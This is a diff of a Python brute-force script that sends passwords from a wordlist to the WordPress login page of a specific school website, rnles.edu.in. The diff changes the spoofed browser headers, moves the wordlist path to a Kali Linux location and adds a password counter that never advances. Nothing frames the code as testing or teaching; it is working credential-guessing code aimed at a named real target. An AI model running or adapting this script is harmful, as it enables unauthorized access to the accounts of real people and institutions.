@@ -9,28 +9,22 @@ cookies = {
 }
 
 headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Microsoft Edge";v="90"',
-    'sec-ch-ua-mobile': '?0',
-    'Upgrade-Insecure-Requests': '1',
-    'Origin': 'https://rnles.edu.in',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Referer': 'https://rnles.edu.in/wp-login.php?redirect_to=https%3A%2F%2Frnles.edu.in%2Fwp-admin%2F&reauth=1',
     'Content-Type': 'application/x-www-form-urlencoded',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-User': '?1',
-    'Sec-Fetch-Dest': 'document',
-    'Referer': 'https://rnles.edu.in/wp-login.php',
-    'Accept-Language': 'en-US,en;q=0.9',
+    'Origin': 'https://rnles.edu.in',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
 }
+
 
 def Brute():
     print()
     print("[*] Started Brute Force Attack On Target")
     print("[+] Attacking")
-    passwords = [x.strip() for x in open('C:\\Users\\hp\\passwords.txt', 'r').readlines() if x]
+    passwords = [x.strip() for x in open('/home/kali/Wordlist.txt', 'r').readlines() if x]
     
     for password in passwords:
         data = {
@@ -40,8 +34,10 @@ def Brute():
           'redirect_to': 'https://rnles.edu.in/wp-admin/',
           'testcookie': '1'
         }
-
-        print("[*] Trying Password: " + password)
+        
+        number = '0'
+        number += '1'
+        print("[*] Trying Password#" + number + ": " + password)
 
         response = requests.post('https://rnles.edu.in/wp-login.php', headers=headers, cookies=cookies, data=data)
 
